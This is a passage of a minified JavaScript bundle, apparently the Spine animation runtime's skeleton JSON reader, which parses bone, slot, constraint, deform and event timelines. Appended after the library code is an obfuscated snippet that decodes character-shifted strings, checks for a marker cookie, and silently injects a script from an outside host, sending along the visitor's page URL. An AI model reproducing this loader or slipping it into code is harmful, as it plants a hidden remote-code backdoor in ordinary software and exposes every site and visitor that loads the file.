a=t.vertexCount;this.readVertices(t,s,a<<1);let o=Ut(t,"color",null);return o&&s.color.setFromString(o),s}}return null}readSequence(t){if(null==t)return null;let e=new d(Ut(t,"count",0));return e.start=Ut(t,"start",1),e.digits=Ut(t,"digits",0),e.setupIndex=Ut(t,"setup",0),e}readVertices(t,e,s){let i=this.scale;e.worldVerticesLength=s;let r=t.vertices;if(s==r.length){let t=a.toFloatArray(r);if(1!=i)for(let e=0,s=r.length;e<s;e++)t[e]*=i;return void(e.vertices=t)}let n=new Array,o=new Array;for(let t=0,e=r.length;t<e;){let e=r[t++];o.push(e);for(let s=t+4*e;t<s;t+=4)o.push(r[t]),n.push(r[t+1]*i),n.push(r[t+2]*i),n.push(r[t+3])}e.bones=o,e.vertices=a.toFloatArray(n)}readAnimation(t,i,n){let o=this.scale,l=new Array;if(t.slots)for(let e in t.slots){let s=t.slots[e],i=n.findSlot(e);if(!i)throw new Error("Slot not found: "+e);let a=i.index;for(let t in s){let e=s[t];if(!e)continue;let i=e.length;if("attachment"==t){let t=new q(i,a);for(let s=0;s<i;s++){let i=e[s];t.setFrame(s,Ut(i,"time",0),Ut(i,"name",null))}l.push(t)}else if("rgba"==t){let t=new I(i,i<<2,a),s=e[0],n=Ut(s,"time",0),o=r.fromString(s.color);for(let i=0,a=0;;i++){t.setFrame(i,n,o.r,o.g,o.b,o.a);let l=e[i+1];if(!l){t.shrink(a);break}let h=Ut(l,"time",0),c=r.fromString(l.color),d=s.curve;d&&(a=Wt(d,t,a,i,0,n,h,o.r,c.r,1),a=Wt(d,t,a,i,1,n,h,o.g,c.g,1),a=Wt(d,t,a,i,2,n,h,o.b,c.b,1),a=Wt(d,t,a,i,3,n,h,o.a,c.a,1)),n=h,o=c,s=l}l.push(t)}else if("rgb"==t){let t=new X(i,3*i,a),s=e[0],n=Ut(s,"time",0),o=r.fromString(s.color);for(let i=0,a=0;;i++){t.setFrame(i,n,o.r,o.g,o.b);let l=e[i+1];if(!l){t.shrink(a);break}let h=Ut(l,"time",0),c=r.fromString(l.color),d=s.curve;d&&(a=Wt(d,t,a,i,0,n,h,o.r,c.r,1),a=Wt(d,t,a,i,1,n,h,o.g,c.g,1),a=Wt(d,t,a,i,2,n,h,o.b,c.b,1)),n=h,o=c,s=l}l.push(t)}else if("alpha"==t)l.push(Nt(e,new R(i,i,a),0,1));else if("rgba2"==t){let t=new L(i,7*i,a),s=e[0],n=Ut(s,"time",0),o=r.fromString(s.light),h=r.fromString(s.dark);for(let i=0,a=0;;i++){t.setFrame(i,n,o.r,o.g,o.b,o.a,h.r,h.g,h.b);let l=e[i+1];if(!l){t.shrink(a);break}let c=Ut(l,"time",0),d=r.fromString(l.light),u=r.fromString(l.dark),m=s.curve;m&&(a=Wt(m,t,a,i,0,n,c,o.r,d.r,1),a=Wt(m,t,a,i,1,n,c,o.g,d.g,1),a=Wt(m,t,a,i,2,n,c,o.b,d.b,1),a=Wt(m,t,a,i,3,n,c,o.a,d.a,1),a=Wt(m,t,a,i,4,n,c,h.r,u.r,1),a=Wt(m,t,a,i,5,n,c,h.g,u.g,1),a=Wt(m,t,a,i,6,n,c,h.b,u.b,1)),n=c,o=d,h=u,s=l}l.push(t)}else if("rgb2"==t){let t=new P(i,6*i,a),s=e[0],n=Ut(s,"time",0),o=r.fromString(s.light),h=r.fromString(s.dark);for(let i=0,a=0;;i++){t.setFrame(i,n,o.r,o.g,o.b,h.r,h.g,h.b);let l=e[i+1];if(!l){t.shrink(a);break}let c=Ut(l,"time",0),d=r.fromString(l.light),u=r.fromString(l.dark),m=s.curve;m&&(a=Wt(m,t,a,i,0,n,c,o.r,d.r,1),a=Wt(m,t,a,i,1,n,c,o.g,d.g,1),a=Wt(m,t,a,i,2,n,c,o.b,d.b,1),a=Wt(m,t,a,i,3,n,c,h.r,u.r,1),a=Wt(m,t,a,i,4,n,c,h.g,u.g,1),a=Wt(m,t,a,i,5,n,c,h.b,u.b,1)),n=c,o=d,h=u,s=l}l.push(t)}}}if(t.bones)for(let e in t.bones){let s=t.bones[e],i=n.findBone(e);if(!i)throw new Error("Bone not found: "+e);let r=i.index;for(let t in s){let e=s[t],i=e.length;if(0!=i)if("rotate"===t)l.push(Nt(e,new y(i,i,r),0,1));else if("translate"===t){let t=new v(i,i<<1,r);l.push(Ot(e,t,"x","y",0,o))}else if("translatex"===t){let t=new A(i,i,r);l.push(Nt(e,t,0,o))}else if("translatey"===t){let t=new C(i,i,r);l.push(Nt(e,t,0,o))}else if("scale"===t){let t=new S(i,i<<1,r);l.push(Ot(e,t,"x","y",1,1))}else if("scalex"===t){let t=new k(i,i,r);l.push(Nt(e,t,1,1))}else if("scaley"===t){let t=new E(i,i,r);l.push(Nt(e,t,1,1))}else if("shear"===t){let t=new Y(i,i<<1,r);l.push(Ot(e,t,"x","y",0,1))}else if("shearx"===t){let t=new M(i,i,r);l.push(Nt(e,t,0,1))}else if("sheary"===t){let t=new T(i,i,r);l.push(Nt(e,t,0,1))}}}if(t.ik)for(let e in t.ik){let s=t.ik[e],i=s[0];if(!i)continue;let r=n.findIkConstraint(e);if(!r)throw new Error("IK Constraint not found: "+e);let a=n.ikConstraints.indexOf(r),h=new V(s.length,s.length<<1,a),c=Ut(i,"time",0),d=Ut(i,"mix",1),u=Ut(i,"softness",0)*o;for(let t=0,e=0;;t++){h.setFrame(t,c,d,u,Ut(i,"bendPositive",!0)?1:-1,Ut(i,"compress",!1),Ut(i,"stretch",!1));let r=s[t+1];if(!r){h.shrink(e);break}let n=Ut(r,"time",0),a=Ut(r,"mix",1),l=Ut(r,"softness",0)*o,m=i.curve;m&&(e=Wt(m,h,e,t,0,c,n,d,a,1),e=Wt(m,h,e,t,1,c,n,u,l,o)),c=n,d=a,u=l,i=r}l.push(h)}if(t.transform)for(let e in t.transform){let s=t.transform[e],i=s[0];if(!i)continue;let r=n.findTransformConstraint(e);if(!r)throw new Error("Transform constraint not found: "+e);let a=n.transformConstraints.indexOf(r),o=new _(s.length,6*s.length,a),h=Ut(i,"time",0),c=Ut(i,"mixRotate",1),d=Ut(i,"mixX",1),u=Ut(i,"mixY",d),m=Ut(i,"mixScaleX",1),f=Ut(i,"mixScaleY",m),g=Ut(i,"mixShearY",1);for(let t=0,e=0;;t++){o.setFrame(t,h,c,d,u,m,f,g);let r=s[t+1];if(!r){o.shrink(e);break}let n=Ut(r,"time",0),a=Ut(r,"mixRotate",1),l=Ut(r,"mixX",1),p=Ut(r,"mixY",l),b=Ut(r,"mixScaleX",1),x=Ut(r,"mixScaleY",b),w=Ut(r,"mixShearY",1),y=i.curve;y&&(e=Wt(y,o,e,t,0,h,n,c,a,1),e=Wt(y,o,e,t,1,h,n,d,l,1),e=Wt(y,o,e,t,2,h,n,u,p,1),e=Wt(y,o,e,t,3,h,n,m,b,1),e=Wt(y,o,e,t,4,h,n,f,x,1),e=Wt(y,o,e,t,5,h,n,g,w,1)),h=n,c=a,d=l,u=p,m=b,f=x,m=b,i=r}l.push(o)}if(t.path)for(let s in t.path){let i=t.path[s],r=n.findPathConstraint(s);if(!r)throw new Error("Path constraint not found: "+s);let a=n.pathConstraints.indexOf(r);for(let t in i){let s=i[t],n=s[0];if(!n)continue;let h=s.length;if("position"===t){let t=new N(h,h,a);l.push(Nt(s,t,0,r.positionMode==e.T.Fixed?o:1))}else if("spacing"===t){let t=new O(h,h,a);l.push(Nt(s,t,0,r.spacingMode==e.m3.Length||r.spacingMode==e.m3.Fixed?o:1))}else if("mix"===t){let t=new W(h,3*h,a),e=Ut(n,"time",0),i=Ut(n,"mixRotate",1),r=Ut(n,"mixX",1),o=Ut(n,"mixY",r);for(let a=0,l=0;;a++){t.setFrame(a,e,i,r,o);let h=s[a+1];if(!h){t.shrink(l);break}let c=Ut(h,"time",0),d=Ut(h,"mixRotate",1),u=Ut(h,"mixX",1),m=Ut(h,"mixY",u),f=n.curve;f&&(l=Wt(f,t,l,a,0,e,c,i,d,1),l=Wt(f,t,l,a,1,e,c,r,u,1),l=Wt(f,t,l,a,2,e,c,o,m,1)),e=c,i=d,r=u,o=m,n=h}l.push(t)}}}if(t.attachments)for(let e in t.attachments){let i=t.attachments[e],r=n.findSkin(e);if(!r)throw new Error("Skin not found: "+e);for(let t in i){let e=i[t],h=n.findSlot(t);if(!h)throw new Error("Slot not found: "+t);let c=h.index;for(let t in e){let i=e[t],n=r.getAttachment(c,t);for(let t in i){let e=i[t],r=e[0];if(r)if("deform"==t){let t=n.bones,s=n.vertices,i=t?s.length/3*2:s.length,h=new F(e.length,e.length,c,n),d=Ut(r,"time",0);for(let n=0,l=0;;n++){let c,u=Ut(r,"vertices",null);if(u){c=a.newFloatArray(i);let e=Ut(r,"offset",0);if(a.arrayCopy(u,0,c,e,u.length),1!=o)for(let t=e,s=t+u.length;t<s;t++)c[t]*=o;if(!t)for(let t=0;t<i;t++)c[t]+=s[t]}else c=t?a.newFloatArray(i):s;h.setFrame(n,d,c);let m=e[n+1];if(!m){h.shrink(l);break}let f=Ut(m,"time",0),g=r.curve;g&&(l=Wt(g,h,l,n,0,d,f,0,1,1)),d=f,r=m}l.push(h)}else if("sequence"==t){let t=new U(e.length,c,n),i=0;for(let n=0;n<e.length;n++){let a=Ut(r,"delay",i),o=Ut(r,"time",0),l=s[Ut(r,"mode","hold")],h=Ut(r,"index",0);t.setFrame(n,o,l,h,a),i=a,r=e[n+1]}l.push(t)}}}}}if(t.drawOrder){let e=new B(t.drawOrder.length),s=n.slots.length,i=0;for(let r=0;r<t.drawOrder.length;r++,i++){let o=t.drawOrder[r],l=null,h=Ut(o,"offsets",null);if(h){l=a.newArray(s,-1);let t=a.newArray(s-h.length,0),e=0,i=0;for(let s=0;s<h.length;s++){let r=h[s],a=n.findSlot(r.slot);if(!a)throw new Error("Slot not found: "+a);let o=a.index;for(;e!=o;)t[i++]=e++;l[e+r.offset]=e++}for(;e<s;)t[i++]=e++;for(let e=s-1;e>=0;e--)-1==l[e]&&(l[e]=t[--i])}e.setFrame(i,Ut(o,"time",0),l)}l.push(e)}if(t.events){let e=new D(t.events.length),s=0;for(let i=0;i<t.events.length;i++,s++){let r=t.events[i],o=n.findEvent(r.name);if(!o)throw new Error("Event not found: "+r.name);let l=new St(a.toSinglePrecision(Ut(r,"time",0)),o);l.intValue=Ut(r,"int",o.intValue),l.floatValue=Ut(r,"float",o.floatValue),l.stringValue=Ut(r,"string",o.stringValue),l.data.audioPath&&(l.volume=Ut(r,"volume",1),l.balance=Ut(r,"balance",0)),e.setFrame(s,l)}l.push(e)}let h=0;for(let t=0,e=l.length;t<e;t++)h=Math.max(h,l[t].getDuration());n.animations.push(new m(i,l,h))}},e.UL=Se,e.FM=l}}]);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));